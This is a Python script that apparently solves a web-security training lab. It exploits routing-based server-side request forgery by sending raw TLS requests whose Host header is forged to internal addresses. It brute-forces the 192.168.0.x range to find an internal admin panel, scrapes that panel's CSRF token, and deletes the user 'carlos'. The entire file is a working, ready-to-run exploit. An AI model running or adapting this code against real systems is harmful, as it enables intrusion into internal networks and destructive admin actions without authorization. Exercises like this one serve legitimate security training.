import socket
import ssl
import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.ip_address = None
        self.csrf = None
        self.cookies = None

    @staticmethod
    def send_crafted_request(hostname, port, bad_host, path, cookies=None, method='GET', data=None, content_type='application/x-www-form-urlencoded'):
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                if path:
                    request_line = f'{method} https://{hostname}/{path} HTTP/1.1\r\n'
                else:
                    request_line = f'{method} https://{hostname}/ HTTP/1.1\r\n'

                headers = f'Host: {bad_host}\r\n'

                if cookies:
                    cookie_str = '; '.join([f'{key}={value}' for key, value in cookies.items()])
                    headers += f'Cookie: {cookie_str}\r\n'

                body = ''
                if method == 'POST' and data:
                    if content_type == 'application/json':
                        import json
                        body = json.dumps(data)
                    else:
                        body = '&'.join([f'{key}={value}' for key, value in data.items()])

                    headers += f'Content-Type: {content_type}\r\n'
                    headers += f'Content-Length: {len(body)}\r\n'

                headers += 'Connection: close\r\n'
                headers += '\r\n'

                request = request_line + headers + body

                ssock.sendall(request.encode('utf-8'))

                response = b''
                while True:
                    data = ssock.recv(4096)
                    if not data:
                        break
                    response += data

                status_code = response.split(b'\r\n')[0].split(b' ')[1]
                res = response.split(b'\r\n\r\n', 1)[1]
                return status_code.decode('utf-8'), res.decode('utf-8')

    def brute_force_private_ip_address(self):
        response = self.session.get(self.lab_url)
        cookies = {}
        for key, value in response.cookies.items():
            cookies[key] = value
        self.cookies = cookies

        for i in range(125, 256):
            status_code, response = self.send_crafted_request(self.lab_url.replace('https://', '').rstrip('/'), 443, '192.168.0.{}'.format(i), None, cookies)
            print(int(status_code))
            if int(status_code) != 504:
                print('192.168.0.{}'.format(i))
                self.ip_address = '192.168.0.{}'.format(i)
                break

    def get_delete_csrf(self):
        status_code, response = self.send_crafted_request(self.lab_url.replace('https://', '').rstrip('/'), 443, self.ip_address, 'admin', self.cookies)
        self.csrf = re.search(r'name="csrf" value="(.*)"', response).group(1)

    def delete_carlos(self):
        data = {
            'username': 'carlos',
            'csrf': self.csrf
        }
        status_code, response = self.send_crafted_request(self.lab_url.replace('https://', '').rstrip('/'), 443, self.ip_address, 'admin/delete', self.cookies, 'POST', data)
        print(status_code)
        print(response)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.brute_force_private_ip_address()
        self.get_delete_csrf()
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
